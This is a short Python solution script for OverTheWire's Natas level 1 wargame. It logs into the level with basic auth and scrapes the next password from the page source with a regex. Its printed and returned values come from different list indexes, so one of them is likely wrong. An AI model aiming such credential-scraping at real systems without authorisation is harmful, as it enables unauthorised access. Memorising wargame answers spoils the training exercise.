import re
import requests


def get_natas2_password(natas1_password):
    URL = "http://natas1.natas.labs.overthewire.org"
    s = requests.Session()
    s.auth = ("natas1", natas1_password)
    r = s.get(URL)
    natas2_password = re.findall(r"([a-zA-Z\d]{32})", r.text) 
    print("[!] The password for Natas 2 is: " + natas2_password[1])
    return natas2_password[0]


if __name__ == '__main__':
    natas1_password = "" # Put here the password for natas1 here
    get_natas2_password(natas1_password)
